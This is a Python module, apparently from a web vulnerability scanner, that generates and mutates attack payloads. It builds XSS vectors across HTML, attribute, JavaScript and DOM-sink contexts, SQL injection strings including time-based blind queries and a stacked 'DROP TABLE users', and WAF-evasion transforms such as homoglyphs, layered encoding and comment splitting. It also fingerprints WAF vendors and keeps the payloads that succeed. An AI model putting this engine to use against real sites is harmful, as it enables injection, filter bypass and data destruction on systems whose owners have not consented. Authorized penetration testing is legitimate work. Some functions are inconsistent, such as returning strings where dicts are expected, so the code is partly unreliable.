"""
Payload Mutation Engine - Transforms payloads to bypass filters and adapt to different contexts.

Key Features:
- Multiple encoding strategies (URL, HTML, Unicode, etc.)
- Case variation
- Tag breaking/obfuscation
- Context-aware payload adaptation
- Mutation tracking (detect what works)
"""

import re
from typing import List, Dict, Tuple, Optional
from urllib.parse import quote, quote_plus
import html
import unicodedata
from bs4 import BeautifulSoup


class PayloadMutationEngine:
    """Generates and transforms payloads for maximum coverage and bypass potential."""
    
    def __init__(self):
        """Initialize mutation strategies."""
        self.mutation_history: Dict[str, List[Dict]] = {}  # Track successful mutations
        self.mutation_stats: Dict[str, Dict[str, Dict[str, int]]] = {}  # {vuln: {mutation_type: {trials, success}}}
        self.blacklisted_mutation_types: set = set()  # prune low-performing patterns
        self.successful_payloads: Dict[str, List[str]] = {}  # {vuln_type: [working_payloads]}
        self.context_mutation_map: Dict[str, List[str]] = {}  # {context: [effective_mutation_types]}
        self.request_budget: int = 50
        self.requests_sent: int = 0
        self.waf_confidence_threshold: float = 0.6
    
    def generate_mutations(self, payload: str, mutation_count: int = 5) -> List[Dict]:
        """
        Generate multiple mutations of a single payload.
        
        Returns List of dicts containing:
            - payload: mutated payload string
            - mutation_type: str (encoding/case/obfuscation/tag_break/unicode/event/comment)
            - description: human-readable description
            - bypass_target: what filter/WAF it targets
            - complexity_score: int 1-10 (harder to generate = higher)
        """
        mutations = []
        
        # 1. URL Encoding variants
        mutations.append({
            'payload': quote(payload),
            'mutation_type': 'url_encode',
            'description': f'URL encoded: {quote(payload)[:50]}',
            'bypass_target': 'basic_url_filter',
            'complexity_score': 1,
            'layers': 1
        })
        
        # 2. Double URL Encoding
        mutations.append({
            'payload': quote(quote(payload)),
            'mutation_type': 'double_url_encode',
            'description': f'Double URL encoded',
            'bypass_target': 'legacy_decode_functions',
            'complexity_score': 2,
            'layers': 2
        })
        
        # 3. HTML Entity Encoding
        mutations.append({
            'payload': html.escape(payload),
            'mutation_type': 'html_encode',
            'description': f'HTML entities: {html.escape(payload)[:50]}',
            'bypass_target': 'html_context',
            'complexity_score': 1,
            'layers': 1
        })
        
        # 4. Mixed case variation (for case-insensitive bypasses)
        mutations.append({
            'payload': self._mixed_case(payload),
            'mutation_type': 'case_variation',
            'description': f'Mixed case variation',
            'bypass_target': 'case_sensitive_filter',
            'complexity_score': 1,
            'layers': 1
        })
        
        # 5. Unicode normalization (different representations of same char)
        mutations.append({
            'payload': self._unicode_variation(payload),
            'mutation_type': 'unicode_encode',
            'description': f'Unicode variant characters',
            'bypass_target': 'blacklist_matching',
            'complexity_score': 3,
            'layers': 1
        })
        
        # 6. Null byte injection (old PHP bypass)
        if len(payload) > 0:
            mutations.append({
                'payload': payload + '%00',
                'mutation_type': 'null_byte',
                'description': f'Null byte terminated',
                'bypass_target': 'string_truncation',
                'complexity_score': 2,
                'layers': 1
            })
        
        # 7. Newline/Carriage return injection
        mutations.append({
            'payload': payload.replace(' ', '\n'),
            'mutation_type': 'newline_inject',
            'description': f'Newlines instead of spaces',
            'bypass_target': 'simple_regex',
            'complexity_score': 1,
            'layers': 1
        })
        
        # 8. Comment-based obfuscation
        mutations.append({
            'payload': self._inject_comments(payload),
            'mutation_type': 'comment_obfuscate',
            'description': f'HTML/JS comments injected',
            'bypass_target': 'pattern_matching',
            'complexity_score': 2,
            'layers': 1
        })
        
        # 9. Hex encoding (for binary data)
        mutations.append({
            'payload': self._to_hex(payload),
            'mutation_type': 'hex_encode',
            'description': f'Hex encoded payload',
            'bypass_target': 'string_blacklist',
            'complexity_score': 2,
            'layers': 1
        })
        
        # 10. Backtick substitution (shell command context)
        if '(' in payload or '$' in payload:
            mutations.append({
                'payload': payload.replace('(', '$(') if '(' not in payload[:2] else payload,
                'mutation_type': 'backtick_sub',
                'description': f'Backtick command substitution',
                'bypass_target': 'parenthesis_filter',
                'complexity_score': 2,
                'layers': 1
            })

        # 11. Delimiter-breaking / parser confusion
        mutations.append({
            'payload': f'" ><script>{payload}</script><script>',
            'mutation_type': 'delimiter_break',
            'description': 'Delimiter breaking and polyglot injection',
            'bypass_target': 'attribute_parser',
            'complexity_score': 5,
            'layers': 2
        })

        # 12. Polyglot quoting cycle and parser confusion
        mutations.append({
            'payload': f"'\"><svg onload=\"{payload}\">",
            'mutation_type': 'polyglot_parser_confusion',
            'description': 'Polyglot parser confusion payload',
            'bypass_target': 'html_parser',
            'complexity_score': 6,
            'layers': 2
        })

        # 13. JS obfuscation wrappers (evade naive sanitizer + encode/unescape)
        escaped = quote(payload)
        js_obf = f"eval(unescape('{escaped}'))"
        mutations.append({
            'payload': js_obf,
            'mutation_type': 'js_obfuscation_eval',
            'description': 'JS eval obfuscation with unescape',
            'bypass_target': 'script_filter',
            'complexity_score': 6,
            'layers': 3
        })

        # 14. DOM-based mutation (safe document insertion vector)
        dom_js = f"document.body.insertAdjacentHTML('beforeend', '{payload}');"
        mutations.append({
            'payload': dom_js,
            'mutation_type': 'dom_insertion',
            'description': 'DOM API insertion payload',
            'bypass_target': 'dom_parser',
            'complexity_score': 5,
            'layers': 2
        })

        # 15. Advanced DOM sinks for modern XSS
        dom_sinks = [
            f"location.hash = '{payload}';",
            f"postMessage('{payload}', '*');",
            f"document.URL = '{payload}';",
            f"innerText = '{payload}'; document.body.innerHTML = document.body.innerText;",
            f"document.write('{payload}');",
            f"document.writeln('{payload}');",
            f"eval('{payload}');",
            f"setTimeout('{payload}', 0);",
            f"setInterval('{payload}', 1000);",
        ]
        for sink in dom_sinks:
            mutations.append({
                'payload': sink,
                'mutation_type': 'dom_sink',
                'description': f'DOM sink: {sink[:30]}...',
                'bypass_target': 'dom_xss',
                'complexity_score': 6,
                'layers': 2
            })

        # 16. CSP bypass style (trusted-types / nonce injection attempt)
        csp_payload = ("const p=new Image();p.src='x';" if 'script' in payload.lower() else payload)
        mutations.append({
            'payload': csp_payload,
            'mutation_type': 'csp_probe',
            'description': 'CSP probe payload (behavior testing)',
            'bypass_target': 'csp',
            'complexity_score': 7,
            'layers': 3
        })

        # 17. Template injection (SSTI/JS templates)
        template_payloads = [
            f"{{{{ {payload} }}}}",
            f"${{{payload}}}",
            f"`${{{payload}}}`",
        ]
        for tp in template_payloads:
            mutations.append({
                'payload': tp,
                'mutation_type': 'template_injection',
                'description': f'Template injection: {tp}',
                'bypass_target': 'template_engine',
                'complexity_score': 5,
                'layers': 1
            })

        # 18. DOM clobbering
        clobber_payload = f"<form id=x><input name=x value='{payload}'>"
        mutations.append({
            'payload': clobber_payload,
            'mutation_type': 'dom_clobbering',
            'description': 'DOM clobbering payload',
            'bypass_target': 'dom_clobber',
            'complexity_score': 7,
            'layers': 2
        })

        # 19. CSS injection
        css_payload = f"<style>@import url(javascript:{payload});</style>"
        mutations.append({
            'payload': css_payload,
            'mutation_type': 'css_injection',
            'description': 'CSS-based injection',
            'bypass_target': 'css_filter',
            'complexity_score': 6,
            'layers': 2
        })

        # prune blacklisted mutation types from further use
        mutations = [m for m in mutations if m['mutation_type'] not in self.blacklisted_mutation_types]

        return mutations[:mutation_count]
    
    def generate_xss_mutations(self, base_payload: str = "alert(1)") -> List[Dict]:
        """
        Generate context-aware XSS mutation variants.
        
        Returns payloads for different contexts:
            - HTML text nodes
            - Attribute values
            - JavaScript code
            - Event handlers
        """
        mutations = []
        
        # Contexts where XSS can manifest
        contexts = {
            'html_text': [
                f'<script>{base_payload}</script>',
                f'<svg onload="{base_payload}">',
                f'<img src=x onerror="{base_payload}">',
                f'<body onload="{base_payload}">',
                f'<iframe srcdoc="<script>{base_payload}</script>">',
            ],
            'html_attribute': [
                f'" onmouseover="{base_payload}" x="',
                f"' onmouseover='{base_payload}' x='",
                f'" autofocus onfocus="{base_payload}" x="',
                f'"><svg onload="{base_payload}">',
            ],
            'javascript': [
                f"';{base_payload};//",
                f'";{base_payload};//',
                f"var x='{base_payload}'",
                f"${base_payload}",
            ],
            'event_handler': [
                f'<img src=x onerror={base_payload}>',
                f'<svg onload={base_payload}>',
                f'<body onload={base_payload}>',
            ]
        }
        
        for context, payloads in contexts.items():
            for payload in payloads:
                mutations.append({
                    'payload': payload,
                    'mutation_type': f'xss_{context}',
                    'description': f'XSS for {context} context',
                    'bypass_target': f'{context}_filter',
                    'complexity_score': 3,
                    'layers': 1
                })
        
        return mutations
    
    def generate_sqli_mutations(self, base_payload: str = "' OR '1'='1", db_type: str = 'generic') -> List[Dict]:
        """
        Generate SQLi mutations for different injection points and database types.

        db_type: mysql, mssql, postgres, oracle, generic
        """
        mutations = []
        
        # SQL injection variants
        variants = [
            ("' OR '1'='1", "Classic OR 1=1"),
            ("' OR '1'='1' --", "OR with comment"),
            ("' OR 1=1 --", "Numeric OR"),
            ("1' AND 1=1 --", "Numeric AND"),
            ("1' AND '1'='1", "String AND"),
            ("' UNION SELECT NULL --", "Union-based"),
            ("' UNION SELECT NULL,NULL,NULL --", "Union 3 columns"),
        ]

        if db_type in ['mssql', 'sqlserver', 'generic']:
            variants.extend([
                ("1; WAITFOR DELAY '0:0:5' --", "Time-based (MSSQL)"),
                ("'; DROP TABLE users; --", "Stacked queries"),
            ])

        if db_type in ['mysql', 'generic']:
            variants.extend([
                ("' AND SLEEP(5) --", "Sleep-based (MySQL)"),
                ("' AND BENCHMARK(5000000,MD5('X')) --", "Benchmark (MySQL)"),
                ("' AND (CASE WHEN 1=1 THEN 1 ELSE 0 END) --", "Boolean blind"),
            ])

        if db_type in ['postgres', 'generic']:
            variants.extend([
                ("' AND (SELECT PG_SLEEP(5)) --", "Sleep-based (PostgreSQL)"),
            ])

        if db_type in ['oracle', 'generic']:
            variants.extend([
                ("' AND (SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE NULL END) --", "Time-based (Oracle)"),
            ])
        
        for payload, description in variants:
            mutations.append({
                'payload': payload,
                'mutation_type': 'sqli_variant',
                'description': f'SQLi: {description}',
                'bypass_target': 'sql_filter',
                'complexity_score': 2,
                'layers': 1
            })
        
        return mutations
    
    def generate_context_aware_payload(self, payload: str, context: str) -> str:
        """
        Adapt payload to context where it will be used.
        
        Contexts:
            - html_tag: Inside <tag>
            - html_attribute: Inside attribute="value"
            - javascript: Inside <script> or JS function
            - json: Inside JSON value
            - url: Inside URL parameter
            - header: Inside HTTP header
        """
        context_map = {
            'html_tag': lambda p: f'<script>{p}</script>',
            'html_attribute': lambda p: f'" onmouseover="{p}" x="',
            'html_attribute_single': lambda p: f"' onmouseover='{p}' x='",
            'javascript': lambda p: f"';alert('{p}');//",
            'json': lambda p: f'","value":"{p}","x":"',
            'url': lambda p: quote(p),
            'header': lambda p: p.replace('\r', '').replace('\n', ''),
            'xml': lambda p: f'<item>{p}</item>',
        }
        
        if context in context_map:
            return context_map[context](payload)
        return payload
    
    def track_mutation(self, payload: str, mutation_type: str, successful: bool, 
                      vulnerability_type: str, context: str = 'none') -> None:
        """Track which mutations work for future optimization."""
        key = f"{vulnerability_type}:{mutation_type}"
        if key not in self.mutation_history:
            self.mutation_history[key] = []

        self.mutation_history[key].append({
            'payload': payload,
            'successful': successful,
            'timestamp': __import__('time').time()
        })

        # enhance feedback loops
        self.mutation_stats.setdefault(vulnerability_type, {}).setdefault(mutation_type, {'trials': 0, 'success': 0})
        self.mutation_stats[vulnerability_type][mutation_type]['trials'] += 1
        if successful:
            self.mutation_stats[vulnerability_type][mutation_type]['success'] += 1
            # Store successful payloads for reuse
            if vulnerability_type not in self.successful_payloads:
                self.successful_payloads[vulnerability_type] = []
            if payload not in self.successful_payloads[vulnerability_type]:
                self.successful_payloads[vulnerability_type].append(payload)
                self.successful_payloads[vulnerability_type] = self.successful_payloads[vulnerability_type][-10:]  # Keep last 10

            # Update context learning
            if context != 'none':
                if context not in self.context_mutation_map:
                    self.context_mutation_map[context] = []
                if mutation_type not in self.context_mutation_map[context]:
                    self.context_mutation_map[context].append(mutation_type)

        # dynamic pruning
        self.prune_low_performers(vulnerability_type)
    
    def get_most_effective_mutations(self, vulnerability_type: str, limit: int = 3) -> List[str]:
        """
        Return most effective mutation types for a vulnerability type.

        Based on tracked success rate and mutation stats.
        """
        effective = []

        stats = self.mutation_stats.get(vulnerability_type, {})
        for mutation_type, data in stats.items():
            trials = data.get('trials', 0)
            success = data.get('success', 0)
            if trials < 3:
                continue
            success_rate = success / trials
            if success_rate > 0.5:
                effective.append(mutation_type)

        # also augment with history events for compatibility
        for key, attempts in self.mutation_history.items():
            if vulnerability_type in key:
                mutation_type = key.split(':')[1]
                if mutation_type in effective:
                    continue
                successes = sum(1 for a in attempts if a['successful'])
                success_rate = successes / len(attempts) if attempts else 0
                if success_rate > 0.5:
                    effective.append(mutation_type)

        return effective[:limit]

    def prune_low_performers(self, vulnerability_type: str, min_trials: int = 5, min_rate: float = 0.2) -> None:
        """Blacklists mutation types that perform poorly with sufficient data."""
        stats = self.mutation_stats.get(vulnerability_type, {})
        for mutation_type, data in stats.items():
            trials = data.get('trials', 0)
            if trials >= min_trials:
                rate = data.get('success', 0) / trials
                if rate < min_rate:
                    self.blacklisted_mutation_types.add(mutation_type)

    def simulate_js_execution(self, payload: str, context: str = 'javascript') -> bool:
        """Heuristic: predict whether a payload plausibly executes in given JS-like context."""
        if context not in ('javascript', 'attribute', 'html'):
            return False

        # DOM sinks (high execution risk)
        dom_sinks = ['innerHTML', 'outerHTML', 'insertAdjacentHTML', 'write', 'writeln', 'eval', 'setTimeout', 'setInterval']
        if any(sink in payload for sink in dom_sinks):
            return True

        # Event triggers
        event_patterns = ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'onsubmit']
        if any(event in payload.lower() for event in event_patterns):
            return True

        # Script/iframe tags
        if any(tag in payload.lower() for tag in ['<script', '<iframe', '<svg', '<img']):
            return True

        # Quote-breaking heuristic for attributes, script scopes
        if context == 'attribute':
            if '"' in payload and payload.count('"') % 2 != 0:
                return True
            if "'" in payload and payload.count("'") % 2 != 0:
                return True

        # Legacy patterns (keep for compatibility)
        if 'alert(' in payload or 'document.' in payload:
            return True

        return False

    def mutate(self, payload: str, max_depth: int = 2, branch_factor: int = 3) -> List[Dict]:
        """Apply recursive mutation chaining to evolve payloads across multiple branches."""
        payloads = [{'payload': payload, 'mutation_type': 'original', 'description': 'original', 'bypass_target': 'none', 'complexity_score': 0, 'layers': 0}]
        current_payloads = [payload]
        seen = set([payload])  # deduplication to prevent explosion

        for depth in range(max_depth):
            next_gen = []

            for current in current_payloads:
                for candidate in self.generate_mutations(current, mutation_count=8):
                    if candidate['payload'] not in seen:
                        next_gen.append(candidate)
                        seen.add(candidate['payload'])

            if not next_gen:
                break

            # prune to highest potential branches to prevent explosion
            next_gen = sorted(next_gen, key=lambda x: (x.get('complexity_score', 1), x.get('layers', 1)), reverse=True)
            next_gen = next_gen[:branch_factor]

            payloads.extend(next_gen)
            current_payloads = [entry['payload'] for entry in next_gen]

        return payloads

    def response_adaptive_mutations(self, payload: str, response_text: str, response_status: int, baseline_size: int, reflection: bool=False) -> List[Dict]:
        """Adapt mutation list based on response/WAF/reflection behavior."""
        waf = self.detect_waf(response_text, response_status, baseline_size)
        context = self.detect_reflection_context(response_text, payload) if reflection else 'none'

        if waf['waf_detected']:
            # WAF present: emphasize heavy encoding
            base = self.generate_mutations(payload, mutation_count=12)
            return sorted(base, key=lambda m: m['layers'], reverse=True)[:8]

        if context == 'javascript':
            return self.generate_xss_mutations(payload)
        if context == 'attribute':
            return [self.generate_context_aware_payload(payload, 'html_attribute'), self.generate_context_aware_payload(payload, 'html_attribute_single')]
        if context == 'html':
            return [self.generate_context_aware_payload(payload, 'html_tag')]

        # default: standard plus layered options
        return self.layered_mutations(payload)

    def layered_mutations(self, payload: str) -> List[Dict]:
        """Generate deliberate layered mutation candidates (multiple transforms)."""
        candidates = []

        # encoding + comment + case
        p1 = html.escape(quote(payload))
        p1 = self._inject_comments(p1)
        candidates.append({'payload': self._mixed_case(p1), 'mutation_type': 'layered_encoding_comment_case', 'description': 'URL+HTML+comment+case layer', 'bypass_target': 'complex_filter', 'complexity_score': 5, 'layers': 3})

        # unicode + comment
        p2 = self._unicode_variation(payload)
        p2 = self._inject_comments(p2)
        candidates.append({'payload': p2, 'mutation_type': 'layered_unicode_comment', 'description': 'Unicode + comment', 'bypass_target': 'unicode_filter', 'complexity_score': 5, 'layers': 2})

        # recursive chain via layered_encode
        p3 = self.layered_encode(payload)
        candidates.append({'payload': p3, 'mutation_type': 'layered_recursive', 'description': 'Recursive layered encode', 'bypass_target': 'deep_decode', 'complexity_score': 6, 'layers': 3})

        # add top default ones
        candidates.extend(self.generate_mutations(payload, mutation_count=3))

        return candidates

    # ===== Private Helper Methods =====
    
    def _mixed_case(self, payload: str) -> str:
        """Convert payload to mixed case (ScRiPt vs script)."""
        result = []
        for i, char in enumerate(payload):
            if char.isalpha():
                result.append(char.upper() if i % 2 == 0 else char.lower())
            else:
                result.append(char)
        return ''.join(result)
    
    def _unicode_variation(self, payload: str) -> str:
        """Replace characters with unicode homoglyphs and apply normalization tricks."""
        # broader homoglyph mapping for stronger bypass coverage
        replacements = {
            'a': '\u0430',  # Cyrillic a
            'b': '\u13cf',  # Cherokee b
            'c': '\u0441',  # Cyrillic c
            'd': '\u0501',  # Cyrillic d
            'e': '\u0435',  # Cyrillic e
            'i': '\u0456',  # Cyrillic i
            'j': '\u049d',  # Cyrillic j
            'o': '\u043e',  # Cyrillic o
            'p': '\u0440',  # Cyrillic p
            's': '\u0455',  # Cyrillic s
            'x': '\u0445',  # Cyrillic x
            'y': '\u0443',  # Cyrillic y
            't': '\u0442',  # Cyrillic t
        }

        transformed = []
        for char in payload:
            lower = char.lower()
            if lower in replacements and len(payload) > 2:
                transformed.append(replacements[lower])
            else:
                transformed.append(char)

        # some normalization variations
        normalized = unicodedata.normalize('NFC', ''.join(transformed))
        nfd = unicodedata.normalize('NFD', normalized)
        return nfd if len(nfd) > 0 else normalized
    
    def _inject_comments(self, payload: str) -> str:
        """Inject comments to break pattern matching."""
        # For XSS
        if '<script>' in payload:
            return payload.replace('<script>', '<scr<!---->ipt>')
        if 'script' in payload.lower():
            return re.sub(r'script', 'scr<!---->ipt', payload, flags=re.I)
        
        # For SQL
        if "'" in payload:
            return payload.replace("'", "/**/'\"/**/'")
        
        # Generic comment injection
        return f"/*!{payload}*/" if payload.strip() else payload
    
    def _to_hex(self, payload: str) -> str:
        """Convert payload to hex representation."""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    
    def get_payload_complexity(self, payload: str) -> int:
        """
        Estimate payload complexity (1-10).
        
        Factors:
            - Length
            - Special characters
            - Encoding layers
            - Nesting depth
        """
        score = 1
        
        # Length factor
        score += min(len(payload) // 10, 3)
        
        # Special character factor
        special_chars = len(re.findall(r'[<>{}()\[\]"\';]', payload))
        score += min(special_chars // 3, 3)
        
        # Encoding detection
        if any(x in payload for x in ['%', '\\x', '&#', '&lt;']):
            score += 1
        
        # Nesting
        nesting = max(
            payload.count('(') - payload.count(')'),
            payload.count('[') - payload.count(']'),
            payload.count('{') - payload.count('}')
        )
        score += min(nesting, 2)
        
        return min(score, 10)

    def layered_encode(self, payload: str) -> str:
        """Apply recursive encoding to build a multi-layer bypass payload."""
        return quote(html.escape(quote(payload)))

    def detect_reflection_context(self, response_text: str, payload: str) -> str:
        """Detect reflection context using DOM-aware analysis."""
        payload_norm = payload.lower()

        try:
            soup = BeautifulSoup(response_text, 'html.parser')
            # JS execution context detection inside script blocks
            for script in soup.find_all('script'):
                script_text = script.get_text()
                if payload_norm in html.unescape(script_text).lower():
                    return 'javascript'

            # attribute context, including event handlers
            for element in soup.find_all(True):
                for attr_name, value in element.attrs.items():
                    if isinstance(value, list):
                        value = ' '.join(value)
                    val_lower = html.unescape(str(value)).lower()
                    if payload_norm in val_lower:
                        if any(event in attr_name.lower() for event in ['onload', 'onclick', 'onerror', 'onmouseover']):
                            return 'javascript'
                        return 'attribute'

            # raw html text after decoding
            if payload_norm in html.unescape(soup.get_text()).lower():
                return 'html'
        except Exception:
            pass

        # fallback simple string
        lower = response_text.lower()
        if f'<script>{payload_norm}' in lower:
            return 'javascript'
        if f'"{payload_norm}"' in lower or f"'{payload_norm}'" in lower:
            return 'attribute'
        if payload_norm in lower:
            return 'html'

        return 'none'

    def detect_waf(self, response_text: str, response_status: int, baseline_size: int, response_time: Optional[float] = None, baseline_time: Optional[float] = None, response_headers: Optional[Dict[str, str]] = None) -> Dict:
        """Detect WAF / blocking behavior based on response and baseline."""
        waf_signatures = [
            "access denied", "forbidden", "request blocked", "security policy",
            "cloudflare", "akamai", "mod_security", "imperva", "sucuri",
            "blocked by", "suspicious activity", "rate limit exceeded"
        ]

        text_lower = response_text.lower()
        waf_detected_sig = any(sig in text_lower for sig in waf_signatures)
        status_block = response_status in [403, 406, 429, 503]
        size_anomaly = abs(len(response_text) - baseline_size) > 5000

        # behavioral detection
        delay_spike = False
        if response_time is not None and baseline_time is not None:
            delay_spike = (response_time - baseline_time) > (baseline_time * 1.5 + 0.5)

        header_anomaly = False
        if response_headers:
            normalized_headers = {k.lower(): v.lower() for k, v in response_headers.items() if v}
            server_header = normalized_headers.get('server', '')
            header_anomaly = 'cloudflare' in server_header or 'akamai' in server_header or 'mod_security' in server_header or 'imperva' in server_header or 'sucuri' in server_header

        # identical block page heuristic is hard to compute w/o history; basic placeholder
        identical_block = waf_detected_sig and status_block

        # WAF signal stricter composition to reduce false positives
        strong_waf = (status_block and (waf_detected_sig or header_anomaly or delay_spike))
        moderate_waf = (waf_detected_sig and (header_anomaly or delay_spike)) or (header_anomaly and delay_spike)
        weak_waf = size_anomaly and (waf_detected_sig or status_block or header_anomaly)

        confidence = 0.0
        confidence += 0.35 if strong_waf else 0
        confidence += 0.25 if moderate_waf else 0
        confidence += 0.1 if weak_waf else 0

        waf_detected = strong_waf or moderate_waf or weak_waf

        return {
            "waf_detected": waf_detected,
            "status_block": status_block,
            "size_anomaly": size_anomaly,
            "delay_spike": delay_spike,
            "header_anomaly": header_anomaly,
            "identical_block": identical_block,
            "confidence": min(confidence, 1.0)
        }

    def mutation_score(self, mutation: Dict, context: str = 'none', waf_confidence: float = 0.0) -> float:
        """Score mutation by complexity, context fit, and WAF environment."""
        score = float(mutation.get('complexity_score', 1))
        score += 0.5 * mutation.get('layers', 1)

        # context relevance bouns
        if context != 'none' and context in mutation.get('bypass_target', ''):
            score += 3.0

        # WAF-aware bias
        score += waf_confidence * 2.0

        return score

    def prioritize_mutations(self, payload: str, vulnerability_type: str, context: str = 'none', waf_confidence: float = 0.0, mutation_count: int = 5) -> List[Dict]:
        """Prioritize mutations by past performance and context/WAF signals."""
        mutations = self.generate_mutations(payload, max(mutation_count * 2, 10))
        effective = self.get_most_effective_mutations(vulnerability_type)

        def score(m):
            base = self.mutation_score(m, context=context, waf_confidence=waf_confidence)
            if self.simulate_js_execution(m.get('payload', ''), context):
                base += 2.0
            if m['mutation_type'] in effective:
                base += 5.0
            return base

        return sorted(mutations, key=score, reverse=True)[:mutation_count]

    def payload_metadata(self, payload: str) -> Dict:
        """Calculate payload metadata for ML features."""
        # count common special characters relevant to filtering and bypass analysis
        special_char_count = len(re.findall(r'[<>{}\[\]"\'\(\);]', payload))
        return {
            "payload_length": len(payload),
            "special_char_count": special_char_count,
            "encoding_layers": payload.count('%') + payload.count('\\x'),
            "uses_event_handler": bool(re.search(r'on(?:error|load)', payload, re.I)),
            "uses_script_tag": '<script>' in payload.lower(),
            "waf_hardness_score": self.get_payload_complexity(payload),
            "ratio_special": special_char_count / max(1, len(payload)),
            "has_quotes": any(c in payload for c in ['"', "'"]),
            "has_eval": 'eval' in payload.lower(),
        }

